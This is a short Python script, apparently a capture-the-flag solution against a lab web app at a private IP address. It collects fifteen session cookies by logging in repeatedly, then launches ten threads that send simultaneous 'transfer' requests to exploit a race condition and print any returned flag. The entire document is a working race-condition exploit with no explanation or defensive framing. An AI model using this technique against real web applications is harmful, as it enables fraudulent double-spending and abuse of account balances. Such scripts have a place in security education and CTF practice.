import requests
import time
from threading import Thread

def f1(a):
    datas = {'a2b':'200.5','action':'transfer'}
    ch = 'PHPSESSID='+ a
    heder = {'Cookie':ch}
    r = requests.post('http://192.168.81.23:8051/index.php', headers=heder, data=datas)
    if "Flag is" in r.text:
        print(r.text)

def f2():
    datas = {'username':'12', 'password':'12', 'action':'login'}
    rc = requests.post('http://192.168.81.23:8051/login.php', data=datas)
    cookie = rc.cookies['PHPSESSID']
    return cookie

cookies = list()
for i in range(15):
    cookies.append(f2())

t1 = Thread(target = f1, args=[cookies[1]])
t2 = Thread(target = f1, args=[cookies[2]])
t3 = Thread(target = f1, args=[cookies[3]])
t4 = Thread(target = f1, args=[cookies[4]])
t5 = Thread(target = f1, args=[cookies[5]])
t6 = Thread(target = f1, args=[cookies[6]])
t7 = Thread(target = f1, args=[cookies[7]])
t8 = Thread(target = f1, args=[cookies[8]])
t9 = Thread(target = f1, args=[cookies[9]])
t10 = Thread(target = f1, args=[cookies[10]])

try:
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()

except :
    print("failed")
